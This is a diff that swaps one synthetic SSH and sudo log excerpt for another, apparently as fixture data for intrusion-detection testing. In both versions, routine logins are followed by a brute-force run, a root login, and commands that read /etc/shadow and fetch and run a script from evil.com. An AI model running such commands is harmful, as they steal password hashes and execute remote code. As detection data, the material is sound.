@@ -1,55 +1,55 @@
-Apr 10 08:00:00 web-srv-01 sshd[5421]: Accepted publickey for monitor from 10.0.1.50 port 56400 ssh2
-Apr 10 08:01:00 web-srv-01 sshd[7394]: Accepted publickey for deploy from 10.0.1.50 port 58672 ssh2
-Apr 10 08:01:00 web-srv-01 sshd[9714]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:04:00 web-srv-01 sshd[2339]: Accepted publickey for monitor from 10.0.2.100 port 43346 ssh2
-Apr 10 08:04:00 web-srv-01 sshd[1633]: Accepted publickey for deploy from 10.0.2.100 port 42676 ssh2
-Apr 10 08:06:00 web-srv-01 sshd[7040]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
-Apr 10 08:08:00 web-srv-01 sshd[7764]: Accepted publickey for deploy from 10.0.1.50 port 40730 ssh2
-Apr 10 08:10:00 web-srv-01 sshd[5449]: Accepted publickey for deploy from 10.0.2.100 port 59728 ssh2
-Apr 10 08:10:00 web-srv-01 sshd[3283]: Accepted publickey for deploy from 10.0.2.100 port 55068 ssh2
-Apr 10 08:17:00 web-srv-01 sshd[1457]: Accepted publickey for monitor from 10.0.2.100 port 48204 ssh2
-Apr 10 08:19:00 web-srv-01 sshd[8604]: Accepted publickey for jsmith from 10.0.1.50 port 51477 ssh2
-Apr 10 08:23:00 web-srv-01 sshd[2347]: Accepted publickey for deploy from 10.0.2.100 port 45567 ssh2
-Apr 10 08:23:00 web-srv-01 systemd[1]: Stopped redis.service
-Apr 10 08:24:00 web-srv-01 sshd[3630]: Accepted publickey for deploy from 10.0.2.100 port 56035 ssh2
-Apr 10 08:24:00 web-srv-01 sshd[7535]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
-Apr 10 08:24:00 web-srv-01 sshd[4501]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:28:00 web-srv-01 sshd[4577]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:29:00 web-srv-01 sshd[2313]: Accepted publickey for monitor from 10.0.2.100 port 46838 ssh2
-Apr 10 08:29:00 web-srv-01 sshd[4606]: Accepted publickey for jsmith from 10.0.2.100 port 54339 ssh2
-Apr 10 08:31:00 web-srv-01 sshd[8158]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
-Apr 10 08:33:00 web-srv-01 sshd[2436]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:40:00 web-srv-01 sshd[6547]: Accepted publickey for deploy from 10.0.2.100 port 56706 ssh2
-Apr 10 08:44:00 web-srv-01 sshd[2722]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:45:00 web-srv-01 sshd[8507]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
-Apr 10 08:49:00 web-srv-01 sshd[9384]: Accepted publickey for jsmith from 10.0.2.100 port 53660 ssh2
-Apr 10 08:50:00 web-srv-01 sshd[9873]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
-Apr 10 09:18:00 web-srv-01 systemd[1]: Stopped cron.service
-Apr 10 09:23:01 web-srv-01 sshd[1420]: Failed password for invalid user root from 185.220.101.42 port 54039 ssh2
-Apr 10 09:23:12 web-srv-01 sshd[2959]: Failed password for invalid user ubuntu from 185.220.101.42 port 44004 ssh2
-Apr 10 09:23:16 web-srv-01 sshd[6683]: Failed password for invalid user ubuntu from 185.220.101.42 port 45551 ssh2
-Apr 10 09:23:24 web-srv-01 sshd[6561]: Failed password for invalid user root from 185.220.101.42 port 50235 ssh2
-Apr 10 09:23:25 web-srv-01 sshd[6348]: Failed password for invalid user admin from 185.220.101.42 port 48681 ssh2
-Apr 10 09:23:28 web-srv-01 sshd[6056]: Failed password for invalid user test from 185.220.101.42 port 47430 ssh2
-Apr 10 09:23:30 web-srv-01 sshd[3720]: Failed password for invalid user ubuntu from 185.220.101.42 port 42921 ssh2
-Apr 10 09:23:30 web-srv-01 sshd[3057]: Failed password for invalid user root from 185.220.101.42 port 50314 ssh2
-Apr 10 09:23:35 web-srv-01 sshd[2690]: Failed password for invalid user test from 185.220.101.42 port 43451 ssh2
-Apr 10 09:23:36 web-srv-01 sshd[6309]: Failed password for invalid user test from 185.220.101.42 port 58004 ssh2
-Apr 10 09:23:37 web-srv-01 sshd[4041]: Failed password for invalid user root from 185.220.101.42 port 52167 ssh2
-Apr 10 09:23:40 web-srv-01 sshd[3885]: Failed password for invalid user admin from 185.220.101.42 port 52078 ssh2
-Apr 10 09:23:45 web-srv-01 sshd[9381]: Failed password for invalid user ubuntu from 185.220.101.42 port 51292 ssh2
-Apr 10 09:23:55 web-srv-01 sshd[5946]: Failed password for invalid user test from 185.220.101.42 port 46972 ssh2
-Apr 10 09:24:02 web-srv-01 sshd[3858]: Failed password for invalid user ubuntu from 185.220.101.42 port 58744 ssh2
-Apr 10 09:24:06 web-srv-01 sshd[1198]: Failed password for invalid user admin from 185.220.101.42 port 51147 ssh2
-Apr 10 09:24:14 web-srv-01 sshd[7874]: Failed password for invalid user ubuntu from 185.220.101.42 port 50056 ssh2
-Apr 10 09:24:15 web-srv-01 sshd[4161]: Failed password for invalid user test from 185.220.101.42 port 52851 ssh2
-Apr 10 09:24:15 web-srv-01 sshd[9020]: Failed password for invalid user root from 185.220.101.42 port 48887 ssh2
-Apr 10 09:24:19 web-srv-01 sshd[4677]: Failed password for invalid user test from 185.220.101.42 port 56726 ssh2
-Apr 10 09:27:00 web-srv-01 sshd[8657]: Accepted password for root from 185.220.101.42 port 55123 ssh2
-Apr 10 09:27:01 web-srv-01 sshd[8657]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
-Apr 10 09:28:00 web-srv-01 sudo[3779]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
-Apr 10 09:28:10 web-srv-01 sudo[4878]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh
-Apr 10 09:28:20 web-srv-01 sudo[8860]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh
-Apr 10 10:07:00 web-srv-01 systemd[1]: Started redis.service
-Apr 10 10:10:00 web-srv-01 systemd[1]: Started mysql.service
-Apr 10 10:43:00 web-srv-01 systemd[1]: Started cron.service
+Apr 10 08:00:00 web-srv-01 sshd[9201]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
+Apr 10 08:00:00 web-srv-01 sshd[2876]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
+Apr 10 08:05:00 web-srv-01 sshd[9933]: Accepted publickey for monitor from 10.0.2.100 port 47184 ssh2
+Apr 10 08:11:00 web-srv-01 sshd[4687]: Accepted publickey for deploy from 10.0.1.50 port 48457 ssh2
+Apr 10 08:13:00 web-srv-01 sshd[8417]: Accepted publickey for monitor from 10.0.1.50 port 59999 ssh2
+Apr 10 08:14:00 web-srv-01 sshd[1241]: Accepted publickey for monitor from 10.0.2.100 port 42504 ssh2
+Apr 10 08:19:00 web-srv-01 sshd[8315]: Accepted publickey for deploy from 10.0.1.50 port 43168 ssh2
+Apr 10 08:19:00 web-srv-01 sshd[5475]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:21:00 web-srv-01 sshd[6084]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:22:00 web-srv-01 sshd[8860]: Accepted publickey for jsmith from 10.0.1.50 port 59556 ssh2
+Apr 10 08:22:00 web-srv-01 sshd[4775]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:23:00 web-srv-01 sshd[8831]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:24:00 web-srv-01 sshd[6597]: Accepted publickey for jsmith from 10.0.1.50 port 58766 ssh2
+Apr 10 08:25:00 web-srv-01 sshd[9039]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:26:00 web-srv-01 sshd[7534]: Accepted publickey for deploy from 10.0.2.100 port 42557 ssh2
+Apr 10 08:28:00 web-srv-01 sshd[4775]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:30:00 web-srv-01 sshd[2081]: Accepted publickey for jsmith from 10.0.1.50 port 44311 ssh2
+Apr 10 08:30:00 web-srv-01 sshd[5785]: Accepted publickey for deploy from 10.0.1.50 port 41545 ssh2
+Apr 10 08:31:00 web-srv-01 systemd[1]: Stopped nginx.service
+Apr 10 08:32:00 web-srv-01 systemd[1]: Started mysql.service
+Apr 10 08:33:00 web-srv-01 sshd[8132]: Accepted publickey for monitor from 10.0.2.100 port 40287 ssh2
+Apr 10 08:41:00 web-srv-01 systemd[1]: Stopped nginx.service
+Apr 10 08:42:00 web-srv-01 sshd[7192]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Apr 10 08:45:00 web-srv-01 sshd[8921]: Accepted publickey for jsmith from 10.0.2.100 port 44682 ssh2
+Apr 10 08:46:00 web-srv-01 sshd[6956]: Accepted publickey for deploy from 10.0.1.50 port 52816 ssh2
+Apr 10 08:46:00 web-srv-01 sshd[9889]: pam_unix(sshd:session): session opened for user jsmith(uid=1001) by (uid=0)
+Apr 10 08:48:00 web-srv-01 sshd[4229]: Accepted publickey for monitor from 10.0.2.100 port 58207 ssh2
+Apr 10 08:49:00 web-srv-01 sshd[9417]: Accepted publickey for jsmith from 10.0.1.50 port 49049 ssh2
+Apr 10 09:17:00 web-srv-01 systemd[1]: Started cron.service
+Apr 10 09:23:07 web-srv-01 sshd[2613]: Failed password for invalid user admin from 185.220.101.42 port 51486 ssh2
+Apr 10 09:23:11 web-srv-01 sshd[9610]: Failed password for invalid user test from 185.220.101.42 port 57209 ssh2
+Apr 10 09:23:19 web-srv-01 sshd[5483]: Failed password for invalid user admin from 185.220.101.42 port 47236 ssh2
+Apr 10 09:23:21 web-srv-01 sshd[9425]: Failed password for invalid user root from 185.220.101.42 port 45995 ssh2
+Apr 10 09:23:31 web-srv-01 sshd[6105]: Failed password for invalid user ubuntu from 185.220.101.42 port 54264 ssh2
+Apr 10 09:23:31 web-srv-01 sshd[8798]: Failed password for invalid user root from 185.220.101.42 port 50402 ssh2
+Apr 10 09:23:34 web-srv-01 sshd[2109]: Failed password for invalid user root from 185.220.101.42 port 42164 ssh2
+Apr 10 09:23:35 web-srv-01 sshd[2795]: Failed password for invalid user root from 185.220.101.42 port 42132 ssh2
+Apr 10 09:23:37 web-srv-01 sshd[1438]: Failed password for invalid user test from 185.220.101.42 port 42598 ssh2
+Apr 10 09:23:45 web-srv-01 sshd[1303]: Failed password for invalid user root from 185.220.101.42 port 48890 ssh2
+Apr 10 09:23:50 web-srv-01 sshd[7844]: Failed password for invalid user admin from 185.220.101.42 port 52661 ssh2
+Apr 10 09:23:51 web-srv-01 sshd[2678]: Failed password for invalid user ubuntu from 185.220.101.42 port 43572 ssh2
+Apr 10 09:23:54 web-srv-01 sshd[8135]: Failed password for invalid user test from 185.220.101.42 port 58561 ssh2
+Apr 10 09:23:56 web-srv-01 sshd[3194]: Failed password for invalid user test from 185.220.101.42 port 59659 ssh2
+Apr 10 09:24:05 web-srv-01 sshd[5531]: Failed password for invalid user admin from 185.220.101.42 port 52160 ssh2
+Apr 10 09:24:11 web-srv-01 sshd[2397]: Failed password for invalid user root from 185.220.101.42 port 40239 ssh2
+Apr 10 09:24:15 web-srv-01 sshd[2461]: Failed password for invalid user test from 185.220.101.42 port 57683 ssh2
+Apr 10 09:24:17 web-srv-01 sshd[1784]: Failed password for invalid user ubuntu from 185.220.101.42 port 52079 ssh2
+Apr 10 09:24:26 web-srv-01 sshd[8279]: Failed password for invalid user test from 185.220.101.42 port 51655 ssh2
+Apr 10 09:24:30 web-srv-01 sshd[7673]: Failed password for invalid user admin from 185.220.101.42 port 42625 ssh2
+Apr 10 09:27:00 web-srv-01 sshd[6923]: Accepted password for root from 185.220.101.42 port 55123 ssh2
+Apr 10 09:27:01 web-srv-01 sshd[6923]: pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)
+Apr 10 09:28:00 web-srv-01 sudo[9718]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Apr 10 09:28:10 web-srv-01 sudo[3513]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/backdoor.sh
+Apr 10 09:28:20 web-srv-01 sudo[7644]:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash /tmp/backdoor.sh
+Apr 10 10:39:00 web-srv-01 systemd[1]: Started cron.service
